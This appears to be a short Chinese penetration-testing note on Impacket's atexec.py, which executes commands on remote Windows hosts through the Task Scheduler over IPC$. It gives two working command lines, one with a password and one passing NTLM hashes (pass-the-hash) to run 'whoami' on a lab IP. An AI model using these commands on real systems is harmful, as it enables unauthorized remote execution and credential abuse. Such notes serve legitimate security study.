Impacket中的atexec.py
Impacket中的atexec.py脚本，就是利用定时任务获取权限，该脚本的利用需要开启ipc$共享。这个脚本仅工作Windows>=Vista的系统上。这个样例能够通过任务计划服务（Task Scheduler）来在目标主机上实现命令执行，并返回命令执行后的输出结果 。

 ./atexec.py  xie/hack:x123456./@192.168.10.130  whoami
 ./atexec.py  xie/hack:@192.168.10.130  whoami  -hashes aada8eda23213c027743e6c498d751aa:b98e75b5ff7a3d3ff05e07f211ebe7a8
